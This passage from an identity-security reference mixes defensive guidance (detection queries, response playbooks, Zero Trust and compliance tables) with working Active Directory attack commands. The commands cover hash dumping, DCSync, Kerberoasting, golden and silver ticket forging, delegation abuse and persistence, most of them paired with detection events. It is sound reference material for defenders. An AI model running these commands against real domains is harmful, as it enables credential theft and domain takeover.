impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### DCSync (T1003.006)

```
Mimikatz:
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv

Requirements:
  - GetChanges (DS-Replication-Get-Changes) right on domain
  - GetChangesAll (DS-Replication-Get-Changes-All) right on domain
  - Default holders: Domain Admins, Enterprise Admins, Domain Controllers

Event log: 4662 (Directory service access) with GUID:
  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (GetChangesAll)
```

#### Credential Guard

```
Protection mechanism:
  - Runs LSASS in isolated virtualization-based security (VBS) process (LSAIso)
  - NTLM hashes and Kerberos TGTs stored in LSAIso — not accessible to
    normal LSASS process
  - Mimikatz sekurlsa::logonpasswords returns only DES/RC4 partial hashes

Enable:
  gpedit: Computer Configuration → Administrative Templates →
          System → Device Guard → "Turn on Virtualization Based Security"
  GUID: {72F428E7-A0C6-4B47-ABEA-55E74FB26F84}

Bypasses (advanced):
  - Hyper-V partition escape (patched in recent builds)
  - DMA attacks (Thunderbolt — mitigate with Kernel DMA Protection)
  - Memory forensics on running system before hibernation
```

---

### Kerberos Attacks (Detailed)

#### Kerberoasting (T1558.003)

```bash
# Impacket (Linux)
impacket-GetUserSPNs corp.local/alice:Password1 \
  -dc-ip 192.168.1.10 -request -outputfile spn_hashes.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:spn_hashes.txt /rc4opsec

# Crack with hashcat
hashcat -m 13100 spn_hashes.txt wordlist.txt -r rules/best64.rule

# Detection
# Event ID 4769 (Kerberos Service Ticket Requested)
# Filter: Ticket Encryption Type = 0x17 (RC4) for service accounts
# with SPNs — legitimate services use AES (0x12)
```

#### AS-REP Roasting (T1558.004)

```bash
# Accounts with "Do not require Kerberos preauthentication" = True
impacket-GetNPUsers corp.local/ -usersfile users.txt \
  -no-pass -dc-ip 192.168.1.10 -outputfile asrep_hashes.txt

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt

# Detection: Event 4768, PreAuthType = 0 (no preauth)
```

#### Golden Ticket (T1558.001)

```
Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:<NTLM hash of KRBTGT> /ptt

Parameters:
  /user      - any username (even non-existent)
  /domain    - FQDN of domain
  /sid       - domain SID (whoami /user → remove last -XXXX RID)
  /krbtgt    - NTLM hash of KRBTGT account
  /id        - RID (500 = built-in Admin, default)
  /groups    - group RIDs to include (512,513,518,519,520 = DA/EA/Schema)
  /startoffset - back-date ticket (evade detection by setting -10 minutes)
  /endin     - ticket lifetime (default 10 years)
  /renewmax  - max renewal (default 10 years)

Detection:
  - Event 4769 with impossible ticket lifetime
  - Event 4672 for privileged logon with anomalous SIDs
  - Silver/Gold ticket: no Event 4768 (no TGT request from DC)
```

#### Silver Ticket

```
Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /target:fileserver.corp.local \
  /service:cifs /rc4:<NTLM hash of computer account> /ptt

Common services: cifs, host, http, ldap, mssql, wsman
```

#### Diamond Ticket

- Requests legitimate TGT from DC, then modifies the PAC in memory
- Harder to detect because Event 4768 is generated (legitimate TGT request)
- Tool: Rubeus `diamond` command

#### Pass-the-Ticket (T1550.003)

```
# Export ticket
Rubeus.exe dump /luid:<logon session> /service:krbtgt

# Import ticket
Rubeus.exe ptt /ticket:base64_encoded_ticket
# or
kerberos::ptt ticket.kirbi
```

#### Unconstrained Delegation Abuse

```
Affected systems: DCs and any server with "Trust this computer for delegation
                  to any service (Kerberos only)" set

Attack:
  1. Compromise server with unconstrained delegation
  2. Force DC to authenticate: SpoolSample.exe <dc> <attacker-server>
     (PrinterBug / MS-RPRN)
  3. DC's TGT cached in LSASS of attacker-server
  4. Extract TGT with Rubeus and impersonate DC

Detection: Event 4624 Type 3 with DC machine account authenticating to
           non-DC server
```

#### Resource-Based Constrained Delegation (RBCD)

```powershell
# Requires GenericWrite on target computer object
# 1. Create/use a computer account you control
$ComputerSid = (Get-ADComputer "attacker-pc").SID.Value
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-ADComputer -Identity "target-server" |
  Set-ADComputer -PrincipalsAllowedToDelegateToAccount $SDBytes

# Rubeus S4U2Self + S4U2Proxy to get a service ticket
Rubeus.exe s4u /user:attacker-pc$ /rc4:<hash> /impersonateuser:Administrator \
  /msdsspn:cifs/target-server.corp.local /ptt
```

---

### LDAP/AD Enumeration

```bash
# BloodHound + SharpHound
# Collect all (requires domain user account)
SharpHound.exe -c All --zipfilename bloodhound_data.zip
bloodhound-python -d corp.local -u alice -p Password1 \
  -c All -ns 192.168.1.10 --zip

# Useful BloodHound queries (Cypher)
MATCH (n:User)-[r:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN n
MATCH p=shortestPath((u:User {enabled:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN          # Find Kerberoastable accounts
Get-DomainComputer -Unconstrained  # Find unconstrained delegation computers
Find-LocalAdminAccess        # Where is current user local admin?
Get-DomainGPO | Get-GPOLocalGroup  # GPO-granted local admin access
```

---

### Domain Persistence

| Technique | Description | Detection |
|---|---|---|
| AdminSDHolder | Write ACL on AdminSDHolder; SDProp propagates to protected objects every 60 min | Audit ACL changes on AdminSDHolder (CN=AdminSDHolder,CN=System,...) |
| DSRM account | Set DSRM account password; enable network logon via reg key | Reg change: HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior |
| Skeleton key | Mimikatz `misc::skeleton` patches LSASS; `Mimikatz` as universal password | Event 4673, 4674; LSASS integrity checks |
| SIDHistory injection | Inject Enterprise Admin SID into user's SIDHistory | Event 4765/4766 (SIDHistory added); Directory service change 5136 |
| ACL backdoors | GenericAll on Domain Admins group, DCSync rights, etc. | 4662 + 5136 on sensitive AD objects |

---

## 9. Service Accounts & Non-Human Identities

### Service Account Risks

| Risk | Description | Mitigation |
|---|---|---|
| Password sharing | Multiple teams know/use the same credentials | Vault + CPM rotation; unique per application |
| Excessive permissions | Service accounts with Domain Admin or broad AD rights | Principle of least privilege; JIT for automation |
| No MFA | Service accounts typically cannot complete MFA | Managed identities / workload identity federation |
| Long-lived credentials | Password unchanged for years | Automated rotation (CyberArk, Vault, AWS Secrets Manager) |
| No ownership | "Orphaned" service accounts with no owner | Mandatory owner tag; quarterly review |

---

### Azure Managed Identities

```bash
# System-assigned (bound to resource lifecycle)
az vm identity assign --name myVM --resource-group myRG

# User-assigned (portable, shared across resources)
az identity create --name myIdentity --resource-group myRG
az vm identity assign --name myVM --resource-group myRG \
  --identities /subscriptions/<sub>/resourceGroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myIdentity

# Use in code (no credentials needed)
from azure.identity import ManagedIdentityCredential
from azure.keyvault.secrets import SecretClient

credential = ManagedIdentityCredential()
client = SecretClient(vault_url="https://myvault.vault.azure.net", credential=credential)
secret = client.get_secret("my-secret")
```

---

### Workload Identity Federation

**GitHub Actions → Azure (no secrets stored):**

```yaml
# .github/workflows/deploy.yml
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: azure/login@v1
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}
```

```bash
# Azure side: create federated credential
az ad app federated-credential create \
  --id <appId> \
  --parameters '{
    "name": "github-actions-federation",
    "issuer": "https://token.actions.githubusercontent.com",
    "subject": "repo:MyOrg/MyRepo:ref:refs/heads/main",
    "audiences": ["api://AzureADTokenExchange"]
  }'
```

---

### AWS IAM Roles for Workloads

```json
// EC2 Instance Profile trust policy
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Service": "ec2.amazonaws.com" },
    "Action": "sts:AssumeRole"
  }]
}

// Lambda execution role (least privilege)
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": ["dynamodb:GetItem", "dynamodb:PutItem"],
    "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/MyTable"
  }]
}
```

---

## 10. Identity Detection & Response

### Detection Rules

#### Golden Ticket Detection

```kql
// Event 4769 with anomalous ticket lifetime (>10 hours)
SecurityEvent
| where EventID == 4769
| extend TicketOptions = tostring(EventData.TicketOptions)
| extend ServiceName = tostring(EventData.ServiceName)
| extend EncryptionType = tostring(EventData.TicketEncryptionType)
// Look for DES/RC4 encryption (0x1, 0x3, 0x17, 0x18)
| where EncryptionType in ("0x1", "0x3", "0x17", "0x18")
| where ServiceName !endswith "$"
| project TimeGenerated, Account, ServiceName, EncryptionType,
          IpAddress, TicketOptions
```

#### DCSync Detection

```kql
// Event 4662 with DS-Replication-Get-Changes-All GUID
SecurityEvent
| where EventID == 4662
| extend Properties = tostring(EventData.Properties)
| where Properties has "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
| where SubjectUserName !endswith "$"  // Exclude machine accounts (legitimate DCs)
| project TimeGenerated, SubjectUserName, SubjectDomainName,
          ObjectName, Properties, Computer
```

#### Pass-the-Hash Detection

```kql
// Event 4624 logon type 3 with NTLM from workstation to workstation
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| extend AuthPackage = tostring(EventData.AuthenticationPackageName)
| extend WorkstationName = tostring(EventData.WorkstationName)
| where AuthPackage == "NTLM"
// Exclude legitimate server-to-server NTLM (file shares)
| where WorkstationName !in (known_servers_list)
| project TimeGenerated, TargetUserName, IpAddress, WorkstationName,
          LogonType, AuthPackage
```

#### MFA Bypass in Entra

```kql
SigninLogs
| where AuthenticationRequirement == "singleFactorAuthentication"
| where ConditionalAccessStatus == "success"
// Expected: singleFactorAuthentication should have been blocked by CA
| where AppDisplayName in ("Microsoft Office 365", "Microsoft Teams", "SharePoint Online")
| project TimeGenerated, UserPrincipalName, AppDisplayName,
          AuthenticationRequirement, ConditionalAccessStatus,
          IPAddress, Location
```

#### Impossible Travel (Splunk SPL)

```spl
index=azure_signin sourcetype=azure:signin result=success
| sort 0 + _time
| transaction user maxspan=1h keepevicted=true
| where eventcount >= 2
| mvexpand ClientIP
| rex field=ClientIP "(?<ip_addr>\d+\.\d+\.\d+\.\d+)"
| iplocation ip_addr
| stats values(Country) as Countries values(ip_addr) as IPs by user
| where mvcount(Countries) >= 2
| table user Countries IPs
```

---

### UEBA (User and Entity Behavior Analytics)

**Key Behavioral Baselines:**
- Login time distribution (08:00–18:00 local → alert on 02:00 login)
- Login geography (typical cities/countries → alert on new region)
- Volume of data accessed per day (100 MB → alert on 10 GB)
- Privileged operations per week (2 → alert on 50)
- Application access patterns (CRM + email → alert on sudden HR system access)

**Peer Group Analysis:**
- Cluster users by department/role
- Alert when user accesses resources that 0 % of peer group accesses
- Reduces false positives vs rule-based detection

---

### Identity Threat Response Playbooks

#### Playbook: Compromised Credential

```
T+0  Alert fires (Entra Identity Protection high user risk or SIEM rule)
T+5  Analyst confirms: review sign-in logs, recent MFA changes, apps accessed
T+10 Contain:
       - Revoke all sessions: Invoke-MgUserRevokeSignInSession -UserId <id>
       - Block sign-in: Update-MgUser -UserId <id> -AccountEnabled:$false
       - Disable Okta user: PUT /api/v1/users/<id>/lifecycle/suspend
T+15 Reset credentials:
       - Force password reset at next login
       - Revoke all app-specific passwords
T+30 Investigate scope:
       - Review audit logs for data exfiltration, email rule changes,
         OAuth app grants
       - Check for new registered devices / MFA methods
T+60 Remediate:
       - Remove malicious OAuth grants
       - Revoke unauthorized MFA factors added
       - Restore any forwarding rules removed
T+120 Document and close
```

#### Playbook: MFA Bypass Detected

```
Trigger: Entra "Token issuer anomaly" + successful sign-in from new IP
T+0  Immediately revoke all sessions for affected user
T+5  Confirm: is this AiTM? Check referer/user-agent in sign-in logs
T+10 Block: add source IP to Entra Named Location (blocked)
T+15 Reset: full credential reset + new FIDO2 enrollment required
T+30 Scope: check all resources accessed with stolen token in past 24h
T+45 Notify user; initiate forensic investigation if data exfiltration suspected
```

---

## 11. Zero Trust Identity Principles

### Never Trust, Always Verify

The Zero Trust model, codified in **NIST SP 800-207**, requires that every
access request be fully authenticated, authorized, and continuously validated
regardless of network location.

**Access Decision Formula:**
```
Access Grant = f(Identity + Device Health + Context + Policy)
  WHERE:
    Identity  = strong auth (FIDO2/MFA) + risk score < threshold
    Device    = MDM enrolled + compliant + no high CVEs
    Context   = location in policy + time-of-day + behavior normal
    Policy    = Conditional Access / ZTNA policy matches request
```

---

### Continuous Access Evaluation (CAE)

**How CAE works:**
1. User authenticates → receives access token (default 1-hour lifetime)
2. Risk event occurs (user disabled, IP blocked, password changed, high risk)
3. IdP pushes CAE event to CAE-capable resource provider
4. Resource provider rejects next API call immediately (no waiting for token expiry)
5. Client receives 401 with `WWW-Authenticate: Bearer claims=...` challenge
6. Client redirects user to re-authenticate

**CAE-capable resources (Microsoft):** Exchange Online, SharePoint Online,
Teams, Graph API, Azure Key Vault

**CAE + Conditional Access + Token Protection** = full defense against AiTM
session replay attacks

---

### NIST SP 800-207 Identity Guidance

Key tenets relevant to identity:
- **Principle 1**: All data sources and computing services are considered
  resources
- **Principle 2**: All communication is secured regardless of network location
- **Principle 3**: Access to individual enterprise resources is granted on a
  per-session basis
- **Principle 4**: Access to resources is determined by dynamic policy
- **Principle 5**: Enterprise monitors and measures the integrity and security
  posture of all owned assets
- **Principle 6**: All resource authentication and authorization is dynamic
  and strictly enforced before access is allowed
- **Principle 7**: Enterprise collects as much information as possible about
  the current state of assets, network infrastructure, and communications

---

### Identity as Control Plane

In a Zero Trust architecture, the identity provider IS the security boundary:
- Every access request — SaaS, IaaS, on-premises — is mediated through the IdP
- The IdP enforces Conditional Access / adaptive authentication
- No implicit trust based on network segment
- Service mesh / mTLS for machine-to-machine (each workload has an identity)
- SPIFFE/SPIRE for workload identity in Kubernetes / cloud-native environments

---

## 12. Compliance & Frameworks

### NIST SP 800-63B — Authenticator Assurance Levels

| AAL | Requirements | Examples |
|---|---|---|
| AAL1 | Single factor: memorized secret OR single-factor OTP | Password, TOTP |
| AAL2 | Two factors: MFA required; approved cryptography | Password + TOTP; password + push |
| AAL3 | Phishing-resistant MFA; hardware-bound authenticator | FIDO2 hardware key, PIV/CAC smart card, WHfB |

**AAL3 requirements (summary):**
- Verifier impersonation resistance (phishing-resistant)
- Hardware cryptographic authenticator (private key never leaves hardware)
- Verifier-CSP communication using approved cryptography
- Reauthentication required every 12 hours or 15 minutes of inactivity

**Phishing-resistant = AAL3** — FIDO2/WebAuthn, PIV, CAC meet this bar.
SMS OTP and push notifications do NOT meet phishing resistance requirement.

---

### CIS Controls — Identity-Specific Safeguards

**CIS Control 5: Account Management**

| Safeguard | IG | Description |
|---|---|---|
| 5.1 | 1 | Establish and maintain an inventory of all accounts |
| 5.2 | 1 | Use unique passwords for all enterprise assets |
| 5.3 | 1 | Disable dormant accounts after 45 days of inactivity |
| 5.4 | 2 | Restrict administrator privileges to dedicated admin accounts |
| 5.5 | 1 | Establish and maintain an inventory of service accounts |
| 5.6 | 3 | Centralize account management via a directory or IAM system |

**CIS Control 6: Access Control Management**

| Safeguard | IG | Description |
|---|---|---|
| 6.1 | 1 | Establish an access-granting process |
| 6.2 | 1 | Establish an access-revoking process |
| 6.3 | 1 | Require MFA for externally-exposed applications |
| 6.4 | 2 | Require MFA for remote network access |
| 6.5 | 2 | Require MFA for administrative access |
| 6.6 | 3 | Establish and maintain an inventory of authentication and authorization systems |
| 6.7 | 3 | Centralize access control |
| 6.8 | 3 | Define and maintain role-based access control |

---

### DISA STIG — Active Directory (V3R3)

**CAT I (High) Findings — Admin Account Controls:**

| STIG-ID | Rule | Fix |
|---|---|---|
| AD.0001 | Accounts with domain admin privileges must not be used for e-mail, web browsing, or other non-admin functions | Create separate privileged and standard accounts |
| AD.0003 | Accounts with enterprise admin privileges must not be used for routine activity | Enforce JIT via PIM; dedicated EA accounts only |
| AD.0010 | The domain must be configured to prevent domain admin accounts from being delegated | Set "Account is sensitive and cannot be delegated" on all admin accounts |
| AD.0015 | The KRBTGT account password must be reset at least every 180 days | Automate KRBTGT rotation; reset twice (due to two-version history) |
| AD.0017 | Default/built-in accounts must have unique passwords and be disabled where possible | Disable Guest, rename Administrator, set complex password |
| AD.0019 | Inactive domain accounts must be disabled within 35 days | Automated IGA rule for inactivity detection + disable |

---

### Related References

- [Active Directory Security](active-directory.md)
- [Zero Trust Reference](ZERO_TRUST_REFERENCE.md)
- [GRC Reference](GRC_REFERENCE.md)
- [Cloud Attack Reference](CLOUD_ATTACK_REFERENCE.md)
- [Windows Hardening](WINDOWS_HARDENING.md)
- [Privilege Escalation Reference](PRIVESC_REFERENCE.md)

---

*Last updated: 2026-04-24 | MITRE ATT&CK v15 | NIST SP 800-63B Rev 3*
